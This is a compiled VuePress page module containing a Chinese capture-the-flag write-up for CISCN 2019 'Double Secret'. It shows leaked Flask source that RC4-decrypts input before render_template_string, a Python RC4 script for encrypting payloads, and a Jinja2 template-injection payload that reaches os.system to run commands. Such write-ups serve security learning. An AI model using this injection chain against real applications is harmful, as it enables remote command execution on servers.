import{_ as t,r as p,o as e,c as o,a as n,b as s,d as c,e as i}from"./app-3b511de6.js";const l={},u=i(`<p>#SSTI 存在 /secret 目录</p><p>传参 secret 在 报错页面有部分 app.py 代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>    <span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&#39;Tell me your secret.I will encrypt it so others can\\&#39;t see&#39;</span>
    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">&quot;HereIsTreasure&quot;</span><span class="token punctuation">)</span>   <span class="token comment">#解密</span>
    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
    
    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">&#39;ciscn&#39;</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&#39;flag detected!&#39;</span>
    <span class="token keyword">return</span> a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>RC4是一种加密算法，对称加密，对明文加密一次得到密文，对密文加密一次又会得到明文 如果我们输入密文，则返回的是明文</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># RC4是一种对称加密算法，那么对密文进行再次加密就可以得到原来的明文</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote


<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">&quot;init_key&quot;</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">&quot;init_message&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(&quot;RC4加密主函数&quot;)</span>
    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> crypt


<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>
    <span class="token comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span>
    <span class="token keyword">return</span> s_box


<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(&quot;调用加密程序成功。&quot;)</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span>
    cipher <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;加密后的字符串是：%s&quot;</span> <span class="token operator">%</span> quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># print(&quot;加密后的输出(经过编码):&quot;)</span>
    <span class="token comment"># print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))</span>
    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>


rc4_main<span class="token punctuation">(</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;text&quot;</span><span class="token punctuation">)</span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>之后利用模板注入，将 payload 加密后传入</p><p>利用 os</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;ls&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,8),r={href:"https://blog.csdn.net/qq_46266259/article/details/128920290",target:"_blank",rel:"noopener noreferrer"};function k(d,v){const a=p("ExternalLinkIcon");return e(),o("div",null,[u,n("p",null,[s("参考 "),n("a",r,[s("[CISCN 2019华东南]Double Secret_ph0ebus的博客-CSDN博客"),c(a)])])])}const m=t(l,[["render",k],["__file","is secret.html.vue"]]);export{m as default};
